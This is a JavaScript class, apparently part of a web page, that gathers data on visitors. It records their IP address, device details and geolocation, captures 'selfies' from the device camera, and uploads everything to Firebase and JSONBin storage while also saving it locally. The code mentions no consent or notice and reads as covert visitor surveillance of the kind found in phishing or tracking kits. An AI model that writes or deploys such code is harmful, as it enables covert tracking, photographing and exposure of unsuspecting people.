class DataCollector {
    static async collectAllData() {
        const dataToSave = {
            timestamp: new Date().toISOString(),
            ip: await this.getIPAddress(),
            device_info: this.getDeviceInfo(),
            latitude: 0,
            longitude: 0,
            selfies: [],
            pageUrl: window.location.href,
            referrer: document.referrer
        };

        // Get location
        try {
            const coords = await this.getGeolocation();
            dataToSave.latitude = coords.latitude;
            dataToSave.longitude = coords.longitude;
        } catch (error) {
            console.log('Location not available');
        }

        // Get selfies
        try {
            dataToSave.selfies = await this.captureSelfies();
        } catch (error) {
            console.log('Camera not available');
        }

        // Save to multiple storage systems
        const results = await this.saveToAllStorages(dataToSave);

        return {
            success: true,
            data: dataToSave,
            storage: results
        };
    }

    static async saveToAllStorages(data) {
        const results = {};
        
        // 1. Local storage (immediate)
        results.local = GitHubFriendlyStorage.saveToLocalStorage(data);
        
        // 2. Online storage (async)
        try {
            results.firebase = await OnlineStorage.saveData(data);
        } catch (error) {
            results.firebase = { success: false, error: error.message };
        }
        
        // 3. JSONBin backup (async)
        try {
            results.jsonbin = await JSONBinStorage.saveData(data);
        } catch (error) {
            results.jsonbin = { success: false, error: error.message };
        }
        
        return results;
    }

    // ... (other methods remain the same)
}
